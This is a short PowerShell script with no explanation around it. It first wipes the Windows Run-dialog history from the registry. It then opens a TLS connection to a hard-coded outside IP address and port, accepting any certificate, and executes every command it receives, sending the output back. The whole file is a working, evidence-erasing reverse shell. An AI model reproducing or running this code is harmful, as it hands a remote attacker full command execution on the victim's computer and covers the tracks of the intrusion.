$Reg =  'Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
$Props = Get-Item -Path $Reg | Select-Object -ExpandProperty Property
foreach ($Prop in $Props) { Remove-ItemProperty -Path $Reg -Name $Prop }
$so = New-Object Net.Sockets.TcpClient('3.141.142.211', 16344)
$st = $so.GetStream()
$ss = New-Object System.Net.Security.SslStream($st,$false,({$True} -as   [Net.Security.RemoteCertificateValidationCallback]))
$ss.AuthenticateAsClient('traefik.me', $null, 'Tls12', $false)
$wr = new-object System.IO.StreamWriter($ss)
$wr.Write('PS ' + (pwd).Path + '> ')
$wr.flush()
[byte[]]$by = 0..65535|%{0};
while(($i = $ss.Read($by, 0, $by.Length)) -ne 0)
{$da = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($by,0, $i);
$sb = (iex $da | Out-String ) 2>&1;
$sb2 = $sb + 'PS ' + (pwd).Path + '> ';
$sy = ([text.encoding]::ASCII).GetBytes($sb2);
$ss.Write($sy,0,$sy.Length);$ss.Flush()}
